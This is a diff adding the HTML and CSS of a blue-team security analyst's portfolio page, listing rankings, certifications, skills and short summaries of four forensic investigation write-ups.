@@ -1,0 +1,824 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Abdeslem Merabti — SOC Analyst & DFIR Enthusiast</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;600;700&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet"/>
+<style>
+  :root {
+    --bg:#050a0e; --bg2:#080f14; --bg3:#0d1821;
+    --green:#00ff9d; --cyan:#00d4ff; --red:#ff3c5a; --gold:#ffd700;
+    --text:#c8d8e8; --muted:#5a7a8a; --border:#1a3040;
+    --glow-green:0 0 18px rgba(0,255,157,.45);
+    --glow-cyan:0 0 18px rgba(0,212,255,.45);
+    --mono:'Share Tech Mono',monospace;
+    --head:'Rajdhani',sans-serif;
+    --body:'Space Mono',monospace;
+  }
+  *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+  html{scroll-behavior:smooth}
+  body{background:var(--bg);color:var(--text);font-family:var(--body);font-size:14px;line-height:1.7;overflow-x:hidden}
+  body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,.08) 2px,rgba(0,0,0,.08) 4px);pointer-events:none;z-index:9999}
+  ::-webkit-scrollbar{width:6px}::-webkit-scrollbar-track{background:var(--bg)}::-webkit-scrollbar-thumb{background:var(--green);border-radius:3px}
+
+  /* NAV */
+  nav{position:fixed;top:0;left:0;right:0;z-index:1000;background:rgba(5,10,14,.92);backdrop-filter:blur(12px);border-bottom:1px solid var(--border);padding:0 2rem;height:58px;display:flex;align-items:center;justify-content:space-between}
+  .nav-logo{font-family:var(--mono);font-size:1rem;color:var(--green);letter-spacing:2px}.nav-logo span{color:var(--muted)}
+  .nav-links{display:flex;gap:1.8rem;list-style:none}
+  .nav-links a{font-family:var(--mono);font-size:.75rem;color:var(--muted);text-decoration:none;letter-spacing:1.5px;text-transform:uppercase;transition:color .2s}
+  .nav-links a:hover{color:var(--green);text-shadow:var(--glow-green)}
+
+  /* HERO */
+  #hero{min-height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:flex-start;padding:100px 8vw 60px;position:relative;overflow:hidden}
+  #hero::before{content:'';position:absolute;inset:0;background-image:linear-gradient(rgba(0,255,157,.04) 1px,transparent 1px),linear-gradient(90deg,rgba(0,255,157,.04) 1px,transparent 1px);background-size:50px 50px;mask-image:radial-gradient(ellipse 80% 80% at 50% 50%,black 30%,transparent 100%)}
+  .hero-orb{position:absolute;width:600px;height:600px;right:-100px;top:50%;transform:translateY(-50%);background:radial-gradient(circle,rgba(0,212,255,.06) 0%,transparent 70%);border-radius:50%;pointer-events:none}
+  .hero-tag{font-family:var(--mono);font-size:.8rem;color:var(--green);letter-spacing:3px;text-transform:uppercase;margin-bottom:1.2rem;animation:fadeUp .6s ease both}
+  .hero-tag::before{content:'> ';opacity:.6}
+  .hero-name{font-family:var(--head);font-size:clamp(3rem,8vw,6.5rem);font-weight:700;line-height:1;letter-spacing:-1px;color:#fff;animation:fadeUp .7s .1s ease both;margin-bottom:.3rem;position:relative}
+  .hero-name .accent{color:var(--green)}
+  .hero-name::before,.hero-name::after{content:attr(data-text);position:absolute;inset:0;opacity:.7}
+  .hero-name::before{color:var(--cyan);animation:glitch 4s infinite .5s;left:2px}
+  .hero-name::after{color:var(--red);animation:glitch 4s infinite 1s;left:-2px}
+  .hero-title{font-family:var(--head);font-size:clamp(1.2rem,3vw,2rem);font-weight:600;color:var(--cyan);letter-spacing:4px;text-transform:uppercase;margin-bottom:1.5rem;animation:fadeUp .7s .2s ease both}
+  .hero-bio{max-width:580px;color:var(--muted);font-size:.85rem;line-height:1.9;margin-bottom:2.5rem;animation:fadeUp .7s .3s ease both}
+  .hero-badges{display:flex;flex-wrap:wrap;gap:.6rem;margin-bottom:2.5rem;animation:fadeUp .7s .4s ease both}
+  .badge{font-family:var(--mono);font-size:.72rem;padding:.3rem .9rem;border-radius:2px;letter-spacing:1px;border:1px solid}
+  .badge-green{border-color:var(--green);color:var(--green);background:rgba(0,255,157,.06)}
+  .badge-cyan{border-color:var(--cyan);color:var(--cyan);background:rgba(0,212,255,.06)}
+  .badge-gold{border-color:var(--gold);color:var(--gold);background:rgba(255,215,0,.06)}
+  .hero-cta{display:flex;gap:1rem;flex-wrap:wrap;animation:fadeUp .7s .5s ease both}
+  .btn{font-family:var(--mono);font-size:.8rem;letter-spacing:2px;text-transform:uppercase;padding:.8rem 2rem;border-radius:2px;cursor:pointer;text-decoration:none;transition:all .25s;display:inline-flex;align-items:center;gap:.5rem}
+  .btn-primary{background:var(--green);color:var(--bg);border:none;font-weight:700}
+  .btn-primary:hover{background:#fff;box-shadow:var(--glow-green);transform:translateY(-2px)}
+  .btn-outline{background:transparent;color:var(--cyan);border:1px solid var(--cyan)}
+  .btn-outline:hover{background:rgba(0,212,255,.1);box-shadow:var(--glow-cyan);transform:translateY(-2px)}
+  .scroll-hint{position:absolute;bottom:2rem;left:50%;transform:translateX(-50%);display:flex;flex-direction:column;align-items:center;gap:.4rem;color:var(--muted);font-family:var(--mono);font-size:.65rem;letter-spacing:2px;animation:bounce 2s infinite}
+  .scroll-hint::after{content:'';width:1px;height:40px;background:linear-gradient(to bottom,var(--muted),transparent);display:block}
+
+  /* SECTIONS */
+  section{padding:7rem 8vw;position:relative}
+  .section-label{font-family:var(--mono);font-size:.75rem;color:var(--green);letter-spacing:3px;text-transform:uppercase;margin-bottom:.5rem}
+  .section-label::before{content:'// ';color:var(--muted)}
+  .section-title{font-family:var(--head);font-size:clamp(2rem,5vw,3.5rem);font-weight:700;color:#fff;line-height:1.1;margin-bottom:3rem}
+  .divider{width:60px;height:2px;background:linear-gradient(90deg,var(--green),transparent);margin:1rem 0 3rem}
+
+  /* ACHIEVEMENTS */
+  #achievements{background:var(--bg2)}
+  .achiev-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:1.5rem}
+  .achiev-card{background:var(--bg3);border:1px solid var(--border);padding:2rem;border-radius:4px;position:relative;overflow:hidden;transition:transform .3s,border-color .3s}
+  .achiev-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--green),var(--cyan));transform:scaleX(0);transform-origin:left;transition:transform .4s}
+  .achiev-card:hover{transform:translateY(-6px);border-color:rgba(0,255,157,.3)}
+  .achiev-card:hover::before{transform:scaleX(1)}
+  .achiev-rank{font-family:var(--head);font-size:3.5rem;font-weight:700;line-height:1;color:var(--gold);margin-bottom:.5rem;text-shadow:0 0 30px rgba(255,215,0,.4)}
+  .achiev-title{font-family:var(--head);font-size:1.1rem;font-weight:600;color:#fff;margin-bottom:.4rem}
+  .achiev-desc{font-size:.78rem;color:var(--muted);line-height:1.7}
+  .achiev-platform{margin-top:1rem;font-family:var(--mono);font-size:.68rem;color:var(--cyan);letter-spacing:1px}
+
+  /* CERTS */
+  .cert-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:1.2rem}
+  .cert-card{background:var(--bg3);border:1px solid var(--border);border-left:3px solid var(--cyan);padding:1.4rem 1.6rem;border-radius:2px;transition:all .3s}
+  .cert-card:hover{background:rgba(0,212,255,.04);border-left-color:var(--green);transform:translateX(6px)}
+  .cert-icon{font-size:1.8rem;margin-bottom:.8rem}
+  .cert-name{font-family:var(--head);font-size:1rem;font-weight:700;color:#fff;margin-bottom:.3rem}
+  .cert-issuer{font-family:var(--mono);font-size:.7rem;color:var(--muted);letter-spacing:1px}
+
+  /* SKILLS */
+  #skills{background:var(--bg2)}
+  .skills-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:1.5rem}
+  .skill-card{padding:1.8rem;border:1px solid var(--border);border-radius:4px;background:var(--bg3);transition:all .3s;overflow:hidden;position:relative}
+  .skill-card::after{content:'';position:absolute;inset:0;background:radial-gradient(circle at 50% 0%,rgba(0,255,157,.06),transparent 70%);opacity:0;transition:opacity .4s}
+  .skill-card:hover::after{opacity:1}
+  .skill-card:hover{border-color:rgba(0,255,157,.25);transform:translateY(-4px)}
+  .skill-number{font-family:var(--mono);font-size:.65rem;color:var(--muted);margin-bottom:1rem;letter-spacing:2px}
+  .skill-name{font-family:var(--head);font-size:1.15rem;font-weight:700;color:var(--green);margin-bottom:.6rem}
+  .skill-desc{font-size:.78rem;color:var(--muted);line-height:1.8}
+
+  /* WRITEUPS */
+  .writeups-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:1.5rem}
+  .writeup-card{background:var(--bg3);border:1px solid var(--border);border-radius:4px;padding:2rem;text-decoration:none;display:block;position:relative;overflow:hidden;transition:all .35s;cursor:pointer}
+  .writeup-card::before{content:'';position:absolute;bottom:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,var(--green),transparent);transform:scaleX(0);transition:transform .4s}
+  .writeup-card:hover{border-color:rgba(0,255,157,.3);transform:translateY(-5px);box-shadow:0 20px 40px rgba(0,0,0,.4)}
+  .writeup-card:hover::before{transform:scaleX(1)}
+  .writeup-type{font-family:var(--mono);font-size:.65rem;letter-spacing:2px;color:var(--red);text-transform:uppercase;margin-bottom:1rem;display:flex;align-items:center;gap:.5rem}
+  .writeup-type::before{content:'';display:inline-block;width:6px;height:6px;border-radius:50%;background:var(--red);box-shadow:0 0 8px var(--red);animation:blink 1.5s infinite}
+  .writeup-title{font-family:var(--head);font-size:1.3rem;font-weight:700;color:#fff;margin-bottom:.6rem;transition:color .2s}
+  .writeup-card:hover .writeup-title{color:var(--green)}
+  .writeup-desc{font-size:.75rem;color:var(--muted);line-height:1.8;margin-bottom:1.4rem}
+  .writeup-link{font-family:var(--mono);font-size:.72rem;color:var(--cyan);letter-spacing:1px;display:flex;align-items:center;gap:.4rem;transition:gap .2s}
+  .writeup-card:hover .writeup-link{gap:.8rem}
+
+  /* CONTACT */
+  #contact{background:var(--bg2);text-align:center}
+  .contact-inner{max-width:640px;margin:0 auto}
+  .contact-quote{font-family:var(--head);font-size:clamp(1.4rem,3vw,2.2rem);font-weight:600;color:#fff;line-height:1.4;margin-bottom:1.5rem}
+  .contact-quote span{color:var(--green)}
+  .contact-sub{font-size:.8rem;color:var(--muted);margin-bottom:2.5rem;line-height:1.8}
+  .contact-links{display:flex;justify-content:center;gap:1rem;flex-wrap:wrap}
+
+  /* TERMINAL */
+  .terminal{background:#030608;border:1px solid var(--border);border-radius:6px;padding:1.5rem;margin:3rem 0;position:relative;font-family:var(--mono);font-size:.8rem;max-width:560px}
+  .terminal-bar{display:flex;gap:.4rem;margin-bottom:1.2rem}
+  .terminal-dot{width:10px;height:10px;border-radius:50%}
+  .dot-r{background:#ff5f57}.dot-y{background:#febc2e}.dot-g{background:#28c840}
+  .t-line{margin-bottom:.4rem;line-height:1.6}
+  .t-prompt{color:var(--green)}.t-cmd{color:#fff}.t-out{color:var(--muted)}.t-val{color:var(--cyan)}
+  .cursor{display:inline-block;width:8px;height:14px;background:var(--green);margin-left:3px;vertical-align:text-bottom;animation:blink 1s step-end infinite}
+
+  /* FOOTER */
+  footer{padding:2rem 8vw;border-top:1px solid var(--border);display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:1rem}
+  .footer-copy{font-family:var(--mono);font-size:.7rem;color:var(--muted)}.footer-copy span{color:var(--green)}
+  .footer-status{display:flex;align-items:center;gap:.5rem;font-family:var(--mono);font-size:.7rem;color:var(--green)}
+  .status-dot{width:7px;height:7px;border-radius:50%;background:var(--green);box-shadow:0 0 6px var(--green);animation:blink 1.8s infinite}
+
+  /* ═══════════════════════════════════════════
+     WRITEUP PANEL (slide-in overlay)
+  ═══════════════════════════════════════════ */
+  .panel-overlay{position:fixed;inset:0;background:rgba(0,0,0,.7);backdrop-filter:blur(4px);z-index:2000;opacity:0;pointer-events:none;transition:opacity .35s}
+  .panel-overlay.open{opacity:1;pointer-events:all}
+
+  .panel{position:fixed;top:0;right:0;bottom:0;width:min(860px,100vw);background:var(--bg);border-left:1px solid var(--border);z-index:2001;overflow-y:auto;transform:translateX(100%);transition:transform .4s cubic-bezier(.25,.46,.45,.94)}
+  .panel.open{transform:translateX(0)}
+
+  /* panel scanline */
+  .panel::before{content:'';position:fixed;top:0;right:0;width:min(860px,100vw);bottom:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,.05) 2px,rgba(0,0,0,.05) 4px);pointer-events:none;z-index:1}
+
+  .panel-nav{position:sticky;top:0;z-index:10;background:rgba(5,10,14,.96);backdrop-filter:blur(12px);border-bottom:1px solid var(--border);padding:0 2rem;height:56px;display:flex;align-items:center;justify-content:space-between}
+  .panel-logo{font-family:var(--mono);font-size:.82rem;color:var(--green);letter-spacing:2px}
+  .panel-logo span{color:var(--muted)}
+  .panel-close{font-family:var(--mono);font-size:.72rem;color:var(--muted);background:none;border:none;cursor:pointer;letter-spacing:1px;display:flex;align-items:center;gap:.5rem;transition:color .2s;padding:.5rem}
+  .panel-close:hover{color:var(--red)}
+
+  .panel-header{padding:3.5rem 2.5rem 2.5rem;background:var(--bg2);border-bottom:1px solid var(--border);position:relative;overflow:hidden}
+  .panel-header::before{content:'';position:absolute;inset:0;background-image:linear-gradient(rgba(0,255,157,.03) 1px,transparent 1px),linear-gradient(90deg,rgba(0,255,157,.03) 1px,transparent 1px);background-size:40px 40px;mask-image:radial-gradient(ellipse 100% 100% at 50% 50%,black,transparent)}
+  .panel-type{font-family:var(--mono);font-size:.7rem;color:var(--red);letter-spacing:3px;text-transform:uppercase;margin-bottom:1rem;display:flex;align-items:center;gap:.5rem}
+  .panel-dot{width:6px;height:6px;border-radius:50%;background:var(--red);box-shadow:0 0 8px var(--red);animation:blink 1.5s infinite}
+  .panel-title{font-family:var(--head);font-size:clamp(2rem,5vw,3.5rem);font-weight:700;color:#fff;line-height:1.1;margin-bottom:1.2rem}
+  .panel-tags{display:flex;flex-wrap:wrap;gap:.7rem;margin-top:1.2rem}
+  .panel-tag{font-family:var(--mono);font-size:.65rem;padding:.25rem .8rem;border-radius:2px;border:1px solid var(--border);color:var(--muted);letter-spacing:1px}
+  .panel-tag.g{border-color:rgba(0,255,157,.3);color:var(--green)}
+  .panel-tag.c{border-color:rgba(0,212,255,.3);color:var(--cyan)}
+  .panel-tag.gold{border-color:rgba(255,215,0,.3);color:var(--gold)}
+
+  /* Markdown styles inside panel */
+  .panel-body{padding:3rem 2.5rem;max-width:100%}
+  .panel-body h1{font-family:var(--head);font-size:1.9rem;font-weight:700;color:var(--green);margin:2.5rem 0 .9rem;padding-bottom:.5rem;border-bottom:1px solid var(--border);line-height:1.2}
+  .panel-body h2{font-family:var(--head);font-size:1.5rem;font-weight:700;color:var(--cyan);margin:2.2rem 0 .8rem;line-height:1.2}
+  .panel-body h3{font-family:var(--head);font-size:1.2rem;font-weight:600;color:#fff;margin:1.8rem 0 .6rem}
+  .panel-body h4{font-family:var(--head);font-size:1rem;font-weight:600;color:var(--gold);margin:1.4rem 0 .5rem}
+  .panel-body p{color:var(--text);font-size:.83rem;line-height:2;margin:.9rem 0}
+  .panel-body a{color:var(--cyan);text-decoration:none;border-bottom:1px solid rgba(0,212,255,.3)}
+  .panel-body a:hover{border-color:var(--cyan)}
+  .panel-body code{font-family:var(--mono);background:var(--bg3);border:1px solid var(--border);padding:.12rem .45rem;border-radius:2px;font-size:.8em;color:var(--green)}
+  .panel-body pre{background:#030608;border:1px solid var(--border);border-left:3px solid var(--green);border-radius:4px;padding:1.3rem;overflow-x:auto;margin:1.5rem 0}
+  .panel-body pre code{background:none;border:none;padding:0;color:var(--text);font-size:.8rem;line-height:1.85}
+  .panel-body blockquote{border-left:3px solid var(--cyan);background:rgba(0,212,255,.04);padding:.8rem 1.3rem;margin:1.4rem 0;border-radius:0 4px 4px 0}
+  .panel-body blockquote p{color:var(--muted);font-style:italic;margin:0}
+  .panel-body ul,.panel-body ol{margin:.8rem 0 .8rem 1.5rem;color:var(--text);font-size:.83rem;line-height:2}
+  .panel-body li::marker{color:var(--green)}
+  .panel-body table{width:100%;border-collapse:collapse;margin:1.5rem 0;font-size:.78rem}
+  .panel-body th{background:var(--bg3);color:var(--cyan);font-family:var(--mono);font-size:.68rem;letter-spacing:1px;text-transform:uppercase;padding:.65rem 1rem;border:1px solid var(--border);text-align:left}
+  .panel-body td{padding:.55rem 1rem;border:1px solid var(--border);color:var(--text)}
+  .panel-body tr:hover td{background:rgba(0,255,157,.02)}
+  /* Images in panel */
+  .img-wrap{position:relative;margin:2rem 0;border-radius:6px;overflow:hidden;border:1px solid var(--border);background:var(--bg3);cursor:zoom-in;transition:border-color .25s,box-shadow .25s}
+  .img-wrap:hover{border-color:rgba(0,255,157,.5);box-shadow:0 0 28px rgba(0,255,157,.13)}
+  .img-wrap img{width:100%;height:auto;display:block}
+  .img-zoom-hint{position:absolute;bottom:.6rem;right:.7rem;font-family:var(--mono);font-size:.6rem;color:var(--green);background:rgba(5,10,14,.88);border:1px solid rgba(0,255,157,.3);padding:.25rem .6rem;border-radius:2px;letter-spacing:1px;opacity:0;transition:opacity .2s;pointer-events:none}
+  .img-wrap:hover .img-zoom-hint{opacity:1}
+  /* Lightbox */
+  #lightbox{position:fixed;inset:0;z-index:9000;background:rgba(0,0,0,.95);display:none;flex-direction:column;align-items:center;justify-content:center;gap:.8rem;padding:1rem}
+  #lightbox.active{display:flex}
+  #lightbox-img{max-width:96vw;max-height:86vh;width:auto;height:auto;border-radius:6px;border:1px solid rgba(0,255,157,.3);box-shadow:0 0 80px rgba(0,0,0,.9);object-fit:contain;animation:lbIn .22s ease;cursor:default}
+  #lightbox-bar{display:flex;align-items:center;justify-content:space-between;width:min(96vw,1000px)}
+  #lightbox-label{font-family:var(--mono);font-size:.68rem;color:var(--muted);letter-spacing:1px}
+  #lightbox-close{font-family:var(--mono);font-size:.72rem;color:var(--muted);background:var(--bg3);border:1px solid var(--border);padding:.4rem 1rem;border-radius:2px;cursor:pointer;letter-spacing:1px;transition:color .2s,border-color .2s}
+  #lightbox-close:hover{color:var(--red);border-color:var(--red)}
+  @keyframes lbIn{from{opacity:0;transform:scale(.93)}to{opacity:1;transform:scale(1)}}
+  .panel-body hr{border:none;border-top:1px solid var(--border);margin:2.2rem 0}
+  .panel-body strong{color:#fff;font-weight:700}
+  .panel-body em{color:var(--muted);font-style:italic}
+
+  .panel-footer{padding:2.5rem;border-top:1px solid var(--border);background:var(--bg2);display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:1rem}
+  .pf-link{font-family:var(--mono);font-size:.7rem;color:var(--muted);text-decoration:none;letter-spacing:1px;transition:color .2s}
+  .pf-link:hover{color:var(--green)}
+
+  /* ANIMATIONS */
+  @keyframes fadeUp{from{opacity:0;transform:translateY(24px)}to{opacity:1;transform:translateY(0)}}
+  @keyframes bounce{0%,100%{transform:translateX(-50%) translateY(0)}50%{transform:translateX(-50%) translateY(8px)}}
+  @keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
+  @keyframes glitch{0%{clip-path:inset(0 0 95% 0);transform:translate(-3px,0)}20%{clip-path:inset(40% 0 50% 0);transform:translate(3px,0)}40%{clip-path:inset(80% 0 5% 0);transform:translate(-2px,0)}60%{clip-path:inset(20% 0 70% 0);transform:translate(2px,0)}80%{clip-path:inset(60% 0 30% 0);transform:translate(-1px,0)}100%{clip-path:inset(0 0 95% 0);transform:translate(0,0)}}
+  .reveal{opacity:0;transform:translateY(30px);transition:opacity .7s ease,transform .7s ease}
+  .reveal.visible{opacity:1;transform:translateY(0)}
+
+  @media(max-width:640px){
+    nav .nav-links{display:none}
+    section{padding:5rem 6vw}
+    #hero{padding:90px 6vw 60px}
+    .panel-header,.panel-body,.panel-footer{padding-left:1.2rem;padding-right:1.2rem}
+  }
+</style>
+</head>
+<body>
+
+<!-- ── NAV ── -->
+<nav>
+  <div class="nav-logo">AM<span>://</span>sec</div>
+  <ul class="nav-links">
+    <li><a href="#about">About</a></li>
+    <li><a href="#achievements">Ranks</a></li>
+    <li><a href="#certs">Certs</a></li>
+    <li><a href="#skills">Skills</a></li>
+    <li><a href="#writeups">Write-ups</a></li>
+    <li><a href="#contact">Contact</a></li>
+  </ul>
+</nav>
+
+<!-- ── HERO ── -->
+<section id="hero">
+  <div class="hero-orb"></div>
+  <div class="hero-tag">SOC Analyst &amp; DFIR Enthusiast</div>
+  <h1 class="hero-name" data-text="Abdeslem Merabti">Abdeslem <span class="accent">Merabti</span></h1>
+  <div class="hero-title">Blue Team · Incident Response · Digital Forensics</div>
+  <p class="hero-bio">Cybersecurity analyst specializing in defensive security, threat hunting, and digital forensics. I investigate real-world attack scenarios, analyze logs, and reconstruct attacker behavior — turning raw evidence into actionable intelligence.</p>
+  <div class="hero-badges">
+    <span class="badge badge-gold">🥇 Global #1 on BTLO</span>
+    <span class="badge badge-green">🏆 Top 10 Elite BTLO</span>
+    <span class="badge badge-cyan">🇩🇿 #1 in Algeria — All Time</span>
+  </div>
+  <div class="hero-cta">
+    <a href="#writeups" class="btn btn-primary">View Investigations →</a>
+    <a href="https://www.linkedin.com/in/abdeslem-merabti-61497a18a" target="_blank" class="btn btn-outline">LinkedIn Profile</a>
+  </div>
+  <div class="scroll-hint">scroll</div>
+</section>
+
+<!-- ── ABOUT ── -->
+<section id="about">
+  <div class="section-label">Profile</div>
+  <h2 class="section-title">About Me</h2>
+  <div class="divider"></div>
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:4rem;align-items:start;max-width:960px">
+    <div>
+      <p style="color:var(--text);line-height:2;font-size:.85rem;margin-bottom:1.2rem">I'm a cybersecurity analyst with a deep focus on the <span style="color:var(--green)">Blue Team</span> side of security — detection, response, and forensic investigation. My approach combines methodical log analysis, endpoint forensics, and network traffic examination to reconstruct exactly what happened during a security incident.</p>
+      <p style="color:var(--muted);line-height:2;font-size:.82rem;margin-bottom:1.2rem">I've climbed to <span style="color:var(--gold)">Global Rank #1</span> on Blue Team Labs Online through hundreds of hands-on investigations covering malware analysis, cloud forensics, network intrusions, and more.</p>
+      <p style="color:var(--muted);line-height:2;font-size:.82rem">Currently seeking a <span style="color:var(--cyan)">SOC Analyst / Blue Team Analyst</span> role where I can channel these skills into protecting real-world environments.</p>
+    </div>
+    <div>
+      <div class="terminal">
+        <div class="terminal-bar"><div class="terminal-dot dot-r"></div><div class="terminal-dot dot-y"></div><div class="terminal-dot dot-g"></div></div>
+        <div class="t-line"><span class="t-prompt">~$ </span><span class="t-cmd">whoami</span></div>
+        <div class="t-line"><span class="t-out">abdeslem_merabti</span></div>
+        <div class="t-line" style="margin-top:.6rem"><span class="t-prompt">~$ </span><span class="t-cmd">cat role.txt</span></div>
+        <div class="t-line"><span class="t-val">SOC Analyst | DFIR Enthusiast</span></div>
+        <div class="t-line" style="margin-top:.6rem"><span class="t-prompt">~$ </span><span class="t-cmd">cat specialties.txt</span></div>
+        <div class="t-line"><span class="t-out">- SIEM &amp; Log Analysis</span></div>
+        <div class="t-line"><span class="t-out">- Incident Response</span></div>
+        <div class="t-line"><span class="t-out">- Digital Forensics (DFIR)</span></div>
+        <div class="t-line"><span class="t-out">- Threat Hunting</span></div>
+        <div class="t-line"><span class="t-out">- Network Traffic Analysis</span></div>
+        <div class="t-line" style="margin-top:.6rem"><span class="t-prompt">~$ </span><span class="cursor"></span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ── ACHIEVEMENTS ── -->
+<section id="achievements">
+  <div class="section-label">Recognition</div>
+  <h2 class="section-title">Achievements</h2>
+  <div class="divider"></div>
+  <div class="achiev-grid reveal">
+    <div class="achiev-card"><div class="achiev-rank">#1</div><div class="achiev-title">Former Global Rank</div><div class="achiev-desc">Reached the top position worldwide on Blue Team Labs Online, outperforming thousands of cybersecurity professionals globally.</div><div class="achiev-platform">BLUE TEAM LABS ONLINE · GLOBAL</div></div>
+    <div class="achiev-card"><div class="achiev-rank" style="color:var(--cyan)">T10</div><div class="achiev-title">Top 10 Elite</div><div class="achiev-desc">Consistently ranked among the Top 10 Elite analysts on BTLO, demonstrating sustained excellence across hundreds of diverse challenges.</div><div class="achiev-platform">BLUE TEAM LABS ONLINE · ELITE TIER</div></div>
+    <div class="achiev-card"><div class="achiev-rank" style="color:var(--green)">#1 🇩🇿</div><div class="achiev-title">All-Time Algeria Rank</div><div class="achiev-desc">The highest-ranked cybersecurity professional in Algeria on BTLO — all time — representing Algerian talent on the world stage.</div><div class="achiev-platform">BLUE TEAM LABS ONLINE · ALGERIA</div></div>
+  </div>
+</section>
+
+<!-- ── CERTIFICATIONS ── -->
+<section id="certs">
+  <div class="section-label">Credentials</div>
+  <h2 class="section-title">Certifications</h2>
+  <div class="divider"></div>
+  <div class="cert-grid reveal">
+    <div class="cert-card"><div class="cert-icon">🌐</div><div class="cert-name">CompTIA Network+</div><div class="cert-issuer">COMPTIA</div></div>
+    <div class="cert-card"><div class="cert-icon">🛡️</div><div class="cert-name">BTL1</div><div class="cert-issuer">SECURITY BLUE TEAM</div></div>
+    <div class="cert-card"><div class="cert-icon">🔍</div><div class="cert-name">Google Cybersecurity Certificate</div><div class="cert-issuer">GOOGLE</div></div>
+    <div class="cert-card"><div class="cert-icon">🎯</div><div class="cert-name">Certified Blue Teamer</div><div class="cert-issuer">CBTEAMER PROFESSIONAL</div></div>
+  </div>
+</section>
+
+<!-- ── SKILLS ── -->
+<section id="skills">
+  <div class="section-label">Capabilities</div>
+  <h2 class="section-title">What I Do</h2>
+  <div class="divider"></div>
+  <div class="skills-grid reveal">
+    <div class="skill-card"><div class="skill-number">01 /</div><div class="skill-name">SIEM &amp; Log Analysis</div><div class="skill-desc">Ingesting and correlating logs from endpoints, firewalls, and servers to identify suspicious patterns and anomalies.</div></div>
+    <div class="skill-card"><div class="skill-number">02 /</div><div class="skill-name">Incident Response</div><div class="skill-desc">Containing active threats, preserving evidence, and guiding post-incident recovery from initial triage through full remediation.</div></div>
+    <div class="skill-card"><div class="skill-number">03 /</div><div class="skill-name">Digital Forensics (DFIR)</div><div class="skill-desc">Disk and memory forensics, timeline reconstruction, and artifact analysis to determine exactly what happened, when, and how.</div></div>
+    <div class="skill-card"><div class="skill-number">04 /</div><div class="skill-name">Threat Hunting</div><div class="skill-desc">Proactively searching for attacker presence, TTPs, and indicators of compromise before alerts fire.</div></div>
+    <div class="skill-card"><div class="skill-number">05 /</div><div class="skill-name">Network Traffic Analysis</div><div class="skill-desc">Pcap analysis, protocol inspection, and lateral movement detection using Wireshark, Zeek, and similar tools.</div></div>
+    <div class="skill-card"><div class="skill-number">06 /</div><div class="skill-name">Attacker Behavior Analysis</div><div class="skill-desc">Mapping adversary techniques to MITRE ATT&amp;CK, reconstructing kill chains, and producing actionable threat intelligence.</div></div>
+  </div>
+</section>
+
+<!-- ── WRITE-UPS ── -->
+<section id="writeups">
+  <div class="section-label">Field Work</div>
+  <h2 class="section-title">Investigations &amp; Write-ups</h2>
+  <div class="divider"></div>
+  <div class="writeups-grid reveal">
+    <div class="writeup-card" onclick="openPanel('rotten-cloud')">
+      <div class="writeup-type">Cloud Investigation</div>
+      <div class="writeup-title">Rotten Cloud</div>
+      <div class="writeup-desc">Deep dive into cloud infrastructure compromise — tracing malicious activity across AWS CloudTrail logs, IAM events, and Azure storage.</div>
+      <div class="writeup-link">Read Investigation <span>→</span></div>
+    </div>
+    <div class="writeup-card" onclick="openPanel('take-a-lap')">
+      <div class="writeup-type">Active Directory Investigation</div>
+      <div class="writeup-title">Take a LAP</div>
+      <div class="writeup-desc">Forensic investigation of a Windows AD environment — unauthorized access, LAPS analysis, and a disgruntled administrator.</div>
+      <div class="writeup-link">Read Investigation <span>→</span></div>
+    </div>
+    <div class="writeup-card" onclick="openPanel('utensilmenace')">
+      <div class="writeup-type">Incident Response</div>
+      <div class="writeup-title">UtensilMenace</div>
+      <div class="writeup-desc">Windows DFIR — malicious game download, privilege abuse via SeRestorePrivilege, binary replacement, and persistence mechanisms.</div>
+      <div class="writeup-link">Read Investigation <span>→</span></div>
+    </div>
+    <div class="writeup-card" onclick="openPanel('clicktrace')">
+      <div class="writeup-type">DFIR Investigation</div>
+      <div class="writeup-title">ClickTrace</div>
+      <div class="writeup-desc">ClickFix attack chain — malicious MSI installer, VPN-obfuscated C2 communication, timestomping, and scheduled task persistence.</div>
+      <div class="writeup-link">Read Investigation <span>→</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- ── CONTACT ── -->
+<section id="contact">
+  <div class="contact-inner reveal">
+    <div class="section-label" style="text-align:center">Hire Me</div>
+    <h2 class="section-title" style="text-align:center;margin-bottom:1.2rem">Let's Work Together</h2>
+    <div class="divider" style="margin:0 auto 2.5rem"></div>
+    <p class="contact-quote">Looking for a <span>SOC Analyst</span> or <span>Blue Team Analyst</span> who can hit the ground running?</p>
+    <p class="contact-sub">I bring hands-on experience in monitoring, detection, and incident response — backed by a proven track record of real-world investigation work and top-tier platform rankings.</p>
+    <div class="contact-links">
+      <a href="https://www.linkedin.com/in/abdeslem-merabti-61497a18a" target="_blank" class="btn btn-primary">Connect on LinkedIn</a>
+      <a href="https://abdeslem9.github.io/abdeslem.github.io" class="btn btn-outline">Visit Portfolio</a>
+    </div>
+  </div>
+</section>
+
+<!-- ── FOOTER ── -->
+<footer>
+  <div class="footer-copy">© 2025 <span>Abdeslem Merabti</span> · Built with intent, not templates.</div>
+  <div class="footer-status"><div class="status-dot"></div>AVAILABLE FOR OPPORTUNITIES</div>
+</footer>
+
+<!-- ════════════════════════════════════════════════
+     WRITEUP PANEL
+════════════════════════════════════════════════ -->
+<div class="panel-overlay" id="overlay" onclick="closePanel()"></div>
+
+<!-- LIGHTBOX -->
